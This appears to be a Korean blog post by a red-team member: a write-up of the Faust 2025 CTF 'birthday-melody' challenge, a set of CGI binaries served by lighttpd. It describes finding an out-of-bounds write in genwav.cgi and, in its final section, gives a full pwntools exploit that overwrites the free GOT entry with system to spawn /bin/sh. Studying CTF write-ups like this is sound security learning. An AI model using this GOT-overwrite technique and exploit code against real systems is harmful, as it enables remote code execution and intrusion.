---
layout: post
title: "[Faust 2025 CTF] birthday-melody Write-up"
author: "SeungYong Lee"
categories: [CTF, Write-up]
tags: [Faust, CTF, Write-up, Exploit, pwnable]
image: assets/images/birthday-melody-write-up/genwav-cgi-got-address-check.png
---

독자 여러분, 안녕하세요!

이번에 제가 레드팀원으로서 오펜시브 시큐리티 업무를 맡아 진행하고 있는 회사에서 V-Sector 라는 팀이 창설되었습니다. 

이 팀의 구성원은 오직 회사 직원들로만 이루어져 있고, 구성원들에게 팀 활동의 강제성을 부여하지 않고, 자유롭게 참여할 자율적 의사를 존중하고 실력이 출중한 사람들이 모여 한 팀이 되어 대회에 참가하고 한층더 성장 할 수 있는 휼륭한 환경을 갖추고 있습니다.

본론으로 들어가기전에 CTF 는 크게 Jeopardy 방식과 Attack-Defense 방식으로 나누어져있음을 말씀드리겠습니다.

Jeopardy 방식은 다양한 주제의 문제들을 해결해 플래그를 획득하는 방식이며, Attack-Defense 방식은 각 팀마다 고유한 서버나 시스템을 받게되며, 이 시스템에 존재하는 취약점을 찾아 공격하고, 다른 팀의 공격으로부터 자신의 시스템을 방어하기 위해 Secure 패치를 합니다.

이번에 참여하게된 Faust 2025 CTF 는 Attack-Defense 방식으로 진행되는 대회였습니다. 대회 시작 일정이 공개되고, 팀 내에서 참석 의사에 대한 투표를 진행되었습니다. 저는 참석하겠다는 의사를 밝혔고, 저를 포함한 9명의 V-Sector 팀원들과 함께 진지한 마음으로 대회에 임하게되었습니다.

2025년 9월 27일 토요일 21:00 KTC 에 대회가 시작되었습니다. 저희는 각자 공격팀, 방어팀으로 나눠 체계적으로 각자 맡은 바를 열심히 하였습니다.

저는 공격팀의 일원으로서 파일 구조상 pwnable 문제로 보이는 Birthday-Melody 라는 문제를 분석했습니다.

Birthday-Melody 문제의 파일 구조는 아래와 같이 구성되어있었습니다.
```
birthday-melody/
├─ cgi/
│  ├─ account.cgi
│  ├─ genwav.cgi
│  ├─ list.cgi
│  ├─ write.cgi
├─ lighttpd/
│  ├─ lighttpd.conf
│  ├─ Dockerfile
├─ static/
│  ├─ favicon.gif
│  ├─ index.html
│  ├─ main-OADRVPNG.js
│  ├─ polyfills-B6TNHZQ6.js
│  ├─ styles-TXJW7TMR.css
docker-compose.yml
docker-images.tar
```

파일 구조만으로 얻을 수 있는 정보는 다음과 같습니다.
- cgi/account.cgi: 계정관련 Interaction 이 존재할 것으로 추측
- cgi/genwav.cgi: wav 포맷의 파일 생성으로 추측
- cgi/list.cgi: 작성한 무언가를 조회할 수 있는 것으로 추측
- cgi/write.cgi: wav 파일을 생성하기 위한 무언가를 작성하는 것으로 추측
- lighttpd/lighttpd.conf: lighttpd 웹 서버로 실행되는 것으로 확인
- lighttpd/Dockerfile: 도커 이미지를 생성하기 위한 파일
- static/*: 웹 리소스
- docker-compose.yml: 다중 컨테이너 관리를 위한 파일
- docker-images.tar: 도커 이미지 파일

Birthday-Melody 문제는 Webnable(Web + Pwnable) 유형이며, 높은 확률로 CGI 파일 바이너리 내 취약점이 존재할 것으로 보입니다.

문제를 분석하기 위해 다음과 같은 방법으로 제 분석용 Laptop 에 구축했습니다.

lighttpd/lighttpd.conf 내 server.use-ipv6 비활성화

```
server.use-ipv6 = "enable"
           ↓
server.use-ipv6 = "disable"
```

도커 이미지 로드
```
docker load -i ./docker-images.tar
```

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/check_docker_image.png"/>
    <figcaption>
        로드된 Birthday-Melody 도커 이미지
    </figcaption>
</figure>

#### 도커 이미지 빌드 및 실행
```
docker compose up --build
```

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/build_docker_image.png"/>
    <figcaption>
        실행된 Birthday-Melody 도커 이미지
    </figcaption>
</figure>

실행된 이미지의 로그를 확인해보니, lighttpd 1.4.82 버전의 웹 서버 위에 구동되는 것을 확인했으며, lighttpd/Dockerfile 내용을 확인한 결과 이는 최신버전이므로, lighttpd 에 관한 1-day 문제는 아닐 것임을 확신했습니다. 

```
# lighttpd/Dockerfile
FROM alpine:latest

RUN apk add lighttpd libstdc++ libgcc libcrypto3

CMD chown lighttpd:www-data /opt/ && lighttpd -D -f /etc/lighttpd/lighttpd.conf
```

로컬 웹 서버에 접근하고, 문제 없는지 살펴보던 중에 HTTP 요청을 전송하게되면 400 에러가 발생하는 추가적인 문제를 발견하게 되었습니다.

문제를 해결하기 위해서, 도커 컨테이너에 대한 권한을 높여보기도 했지만, 문제는 여전히 해결되지 않았습니다.

끙끙 씨름하며 Trouble-Shooting 하고 있던 중, 컨테이너 내에서 웹 서버를 실행하는 사용자의 권한이 낮아 문제가 발생하고 있다는 점을 발견을 했습니다.

이는, lighttpd.conf 내용 내에, server.username, server.groupname 을 주석 처리 해준 뒤, 다시 빌드 및 실행 해보니 문제가 해결되었습니다.
```
server.username = "lighttpd"
server.groupname = "www-data"
            ↓
# server.username = "lighttpd"
# server.groupname = "www-data"
```

성공적으로 로컬에 웹 서버를 구축하고, 모든 CGI 파일에 대한 mitigation 을 확인해보았습니다.

```
  Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
```

x86_64 바이너리며, No RELRO 이기 때문에, GOT Overwrite 공격이 가능하고, 그 외 Canary, NX, PIE는 모든 활성화 되어있기 때문에에, 주소를 Leak 할 수 있는 취약점을 찾지 않는 이상 무언가를 하기 어렵다는 것을 알았습니다.

구축된 웹 서버에서 어떤식으로 HTTP 요청을 수행하는지 확인하기 위해 웹 페이지에 접근했습니다.

파일 구조에서 얻었던 추측한 정보에서 알 수 있듯, 계정과 관련된 Interaction 이 존재하는 것을 확인할 수 있었습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/birthday-melody-web-main-page.png"/>
    <figcaption>
        Birthday-Melody 웹 메인 페이지
    </figcaption>
</figure>

회원가입 쪽을 확인해보고, 회원가입 시도를 해보니, account.cgi 엔드포인트단 에 HTTP 요청을 보내는 것을 확인했습니다.
따라서, cgi/account.cgi 바이너리를 분석하면 회원가입과 관련된 취약점을 발견할 수 있지 않을까라는 기대감으로 account.cgi 를 분석하기로 결정했습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/birthday-melody-web-register-cgi.png"/>
    <figcaption>
        Birthday-Melody 회원가입 시도
    </figcaption>
</figure>

유저 이름에 "/" 가 있는지 확인 후, 존재한다면 "Invalid user 'UserName'" 을 응답합니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/account-cgi-filter-check.png"/>
    <figcaption>
        account.cgi 내 유저 이름 필터링
    </figcaption>
</figure>

회원가입에 성공하면 다음과 같이 Set-Cookie 응답을 합니다.

```
HTTP/1.1 200 OK
Set-Cookie: user=pppp; Path=/
Set-Cookie: auth=f41ed52764297259533aec19202cbcaabe216bc0b7aca916e2408581d07ef18b; Path=/
Content-Length: 7
Date: Thu, 09 Oct 2025 09:16:32 GMT
Server: lighttpd/1.4.82
```

Set-Cookie 관련 로직은 account.cgi main 함수 끝 부분에서 확인 할 수 있는데, 회원가입한 username 이 그대로 응답 창에 들어가게 되고, "/" 말고 필터링 해주는 것이 없기 때문에 Header Injection 이 가능할 수 있다고 생각했습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/cookie_injectable.png"/>
    <figcaption>
        account.cgi Set-Cookie 로직
    </figcaption>
</figure>

하지만, 필터링이 없음에도 불구하고 \n, \r 같은 문자는 막히기 때문에 헤더 Header Injection 이 불가능했습니다.
아쉬움을 뒤로한채 Post-Auth 기능들을 확인했습니다.

로그인 후, Melody 를 추가할 수 있는 기능이 존재했습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/melody-add.png"/>
    <figcaption>
        Melody 추가 기능 확인
    </figcaption>
</figure>

"+add" 버튼을 누르자 MetaData 와 Notes 를 만들고 저장할 수 있는 UI 가 표시되었습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/melody-add-ui.png"/>
    <figcaption>
        Melody 추가 UI
    </figcaption>
</figure>

일단 "save" 버튼을 눌러 어떤 HTTP 요청을 보내는지 확인해보니 write.cgi 엔드포인트단에 요청하니 write.cgi 바이너리를 분석해야겠다고 생각했습니다.

```
POST /cgi-bin/write.cgi?name=3986e908-91ec-43d2-9b44-b1cf02e26105 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
Content-Length: 96
Content-Type: application/json
Cookie: user=pppp; auth=f41ed52764297259533aec19202cbcaabe216bc0b7aca916e2408581d07ef18b
Host: 127.0.0.1:7422
Origin: http://127.0.0.1:7422
Referer: http://127.0.0.1:7422/create
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

{
    "length": 1,
    "hertz": 44100,
    "data": [],
    "metadata": {
        "name": "",
        "author": "",
        "comment": ""
    }
}
```

분석한 결과, name 은 파일 경로되어 /opt/usr/ 디렉토리 하위에 파일이 생성됩니다.
여기서, 경로를 조작한 임의의 파일 생성이 가능할 것 같았지만, name 에 "/" 가 포함되었는지 검사하기 때문에 불가능하다는 것을 알았습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/write-cgi-filter.png"/>
    <figcaption>
        write.cgi "/" 검사
    </figcaption>
</figure>

여기까지 분석했을때 대회가 끝나기전까지 시간이 얼마 남지 않았기 때문에 남은 시간은 회원가입 쪽에서 Header Injection 을 하는 방법을 모색하는 것으로 결정했지만, 끝내 풀어낼 수 없었습니다.

대회가 끝난 이후, 아무도 풀지 못한 Birthday-Melody 문제에 대한 집착이 생겼습니다. 꼭 풀어내고야 말겠다는 생각으로 시간을 틈틈이 할애하다 보니 결국 Birthday-Melody 문제의 풀이 방법을 알아낼 수 있었습니다. 지금부터 그 풀이에 대해서 말씀드리겠습니다.

분석은 CGI 바이너리만 우분투 환경에서 실행 조건 맞춰준 뒤 진행했습니다.

우분투 환경
```
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 24.04.2 LTS
Release:        24.04
Codename:       noble
```

musl 설치 및 CGI 바이너리 실행
```
#!/bin/sh

wget https://musl.libc.org/releases/musl-1.2.5.tar.gz

tar -xvzf musl-1.2.5.tar.gz
 cd musl-1.2.5/
./configure --prefix=/usr/local/musl
make -j$(nproc)

sudo make install

wget http://dl-cdn.alpinelinux.org/alpine/latest-stable/main/x86_64/libstdc++-14.2.0-r6.apk
wget http://dl-cdn.alpinelinux.org/alpine/latest-stable/main/x86_64/libgcc-14.2.0-r6.apk

mkdir alpine-libs

tar -xzf libstdc++-*.apk -C alpine-libs
tar -xzf libgcc-*.apk -C alpine-libs

# LD_LIBRARY_PATH=alpine-libs/usr/lib /lib/ld-musl-x86_64.so.1 ./<cgi_binary_name>
```

정상 실행되는 CGI 바이너리
<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/cgi_execute.png"/>
    <figcaption>
        genwav.cgi 실행
    </figcaption>
</figure>


실행할 수 있는 환경도 갖추었겠다, 취약점 발생 원인을 말씀드리겠습니다.
취약점 발생 원인은 genwav.cgi 바이너리 내에 OOB(Out-of-Bound) Write 취약점이 존재했고, 앞서 CGI 바이너리의 mitigation 정보를 토대로 No-RELRO 이므로 GOT Overwrite 를 통해 원하는 함수를 호출 할 수 있었습니다.

/cgi-bin/write.cgi 엔드포인트 요청에 JSON 데이터(length, hertz, data, metadata, ..)가 어떻게 전달되는지 정적분석을 했습니다.

데이터를 전달받아 데이터 섹션에 존재하는 전역변수 data[start + i ] 에 값을 씁니다. 이때 i 는 인덱스이고, start 값은 조작해서 전달 가능한 데이터 입니다. 게다가 start 값은 end 값 보다 작은지만 검사하고 Integer Overflow 관련 검사 로직이 존재하지 않기 때문에, 우리는 전역 변수 data 의 주소를 기준으로 오프셋을 조정하여, 조정된 주소에 연산된 accum 변수 2 바이트 값을 더할 수 있습니다. 

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/genwav-cgi-readaility-up.png"/>
    <figcaption>
        genwav.cgi main 함수 내 데이터 전달 받는 곳 가독성 증진 작업 후
    </figcaption>
</figure>

start 값을 조정해보니 성공적으로 GOT 주소를 가리킬 수 있었습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/genwav-cgi-got-address-check.png"/>
    <figcaption>
        동적 디버깅을 통한 GOT 영역에 있는 malloc 주소 확인
    </figcaption>
</figure>

accum 값을 원하는 값을 원하는 값으로 맞춰주기 위해서는 accum 연산에 대해 역산을 해야합니다.

accum 연산
```
accum = i * frequency_cal
accum = accum / hertz
accum = accum + offset
accum = accum * 2π
accum = sin(accum) * amplitude
accum = accum * 32767

# accum = 32767 * amplitude * sin((i * frequency_cal / hertz + offset) * 2π)
```

위 식을 accum == amplitude 가 되도록 역산을 하면

```
amplitude = 32767 * sin((i * frequency_cal / hertz + offset) * 2π)
```

이므로 python 코드로 작성해서 필요한 amplitude 값을 찾았습니다.
```
offset = 2

def find_amplitude(i, frequency, offset, hertz, bitwidth=64):
    mask = (1 << bitwidth) - 1
    if frequency < 0:
        unsigned_freq = frequency & mask
        shifted = (unsigned_freq >> 1)
        lowbit = unsigned_freq & 1
        reconstructed = shifted | lowbit
        frequency_cal = float(reconstructed + reconstructed)
    else:
        frequency_cal = float(frequency)

    phase = (i * frequency_cal / hertz + offset) * 2 * math.pi
    sin_val = math.sin(phase)

    amplitude = offset / (32767.0 * sin_val)
    return amplitude

amp = find_amplitude(i, frequency, offset, hertz)
print("calculated amplitude:", amp)
```

이상하게 들어가는건 수동으로 조절해가면서 하니 accum 값에 원하는 값을 넣을 수 있게되었습니다. 이제 GOT 에 존재하는 함수 들중 어떤 걸 무엇으로 조작해서 무언가를 할 수 있을지 분석해보았습니다. genwav.cgi+0x5cc1 에서 전역변수 data 내 값을 복사한 data_dup 을 첫 번째 인자로 호출하는 free 함수 발견했습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/find_got_overwrite_point.png"/>
    <figcaption>
        data_dup 을 첫 번째인자로 free 함수 호출 확인
    </figcaption>
</figure>

여기서 저는 free GOT 주소를 system 주소로 수정한 뒤, 전역변수 data 에 명령어를 넣으면 실행될 거라고 생각했습니다.

```
             GOT Overwrite
  --------------  ↓  ------------
 |   free GOT   | = |   system   |
  --------------     ------------

  ---------[ data section ] ------------
 | /bin/sh \x00\x00\x00\x00\x00\x00\x00 |
 | \x00\x00\x00\x00\x00\x00\x00\x00\x00 |
 | \x00\x00\x00\x00\x00\x00\x00\x00\x00 |
 | \x00\x00\x00\x00\x00\x00\x00\x00\x00 |
 | \x00\x00\x00\x00\x00\x00\x00\x00\x00 |
 | \x00\x00\x00\x00\x00\x00\x00\x00\x00 |
 | .................................... |
 | .................................... |
  --------------------------------------
```

이를 토대로 익스플로잇 코드를 작성했고, 실행한 결과 성공적으로 명령어 실행이 가능했으며, 쉘 획득이 가능했습니다.

<figure style="text-align: center">
    <img src="/assets/images/birthday-melody-write-up/get-shell.png"/>
    <figcaption>
        명령어 실행을 통한 쉘 획득
    </figcaption>
</figure>

아래는 최종 익스플로잇 코드입니다.
```
from pwn import *
from json import dumps

offset = 140.5 # free got address offset
body = dumps({
    "length": 0,
    "hertz": 0xfffffffffffffffffffffffffffffffffffff,
    "data":[
        {
            "start": 0,
            "end": 1,
            "frequency": 0,
            "amplitude": -0x2a805ffffe,
            "offset": 0x622f # /b
        },
        {
            "start": 1,
            "end": 2,
            "frequency": 0,
            "amplitude": 0x2f36bfffff,
            "offset": 0x6e69 # in
        },
        {
            "start": 2,
            "end": 3,
            "frequency": 0,
            "amplitude": -0x13893fffff,
            "offset": 0x732f # /s
        },
        {
            "start": 3,
            "end": 4,
            "frequency": 0,
            "amplitude": 0x179f3fffff,
            "offset": 0x68 # h\x00
        },
        { # for pointing the GOT entry to system function
            "start": (-1888 + (8 * offset)),
            "end": (-1888 + (8 * offset) + 1),
            "frequency": 0,
            "amplitude": 0x1f34ffffff,
            "offset": 0x6ee0 
        },
        { # for pointing the GOT entry to system function
            "start": (-1888 + (8 * offset)) + 1,
            "end": (-1888 + (8 * offset) + 2),
            "frequency": 0,
            "amplitude": -0x201a1fffff,
            "offset": 0x2
        },
    ],
})

env = {
    "LD_LIBRARY_PATH": "./alpine-libs/usr/lib",
    "REQUEST_METHOD": "POST",
    "QUERY_STRING": "id=-",
    "CONTENT_TYPE": "application/json",
    "CONTENT_LENGTH": str(len(body.encode())),
}

p = process(["/lib/ld-musl-x86_64.so.1", "./genwav.cgi"], env=env)

p.send(body.encode())

p.interactive()
```

저는 성공적으로 이 문제를 풀게되어 정말 기쁘고, 분석하는 과정을 통해 새로운 배움을 얻게 되었습니다.
그리고 방향성을 못잡고 큰 벽 처럼 느껴지는 문제라도, 집요하게 잡고 시간을 들인다면, 결국 무너뜨릴 수 있다는 자신감 또한 얻었습니다.

끝으로, Faust 2025 CTF 에서 출제된 Birthday-Melody 문제의 저의 write-up 을 봐주신 여러분께 진심으로 감사드립니다.

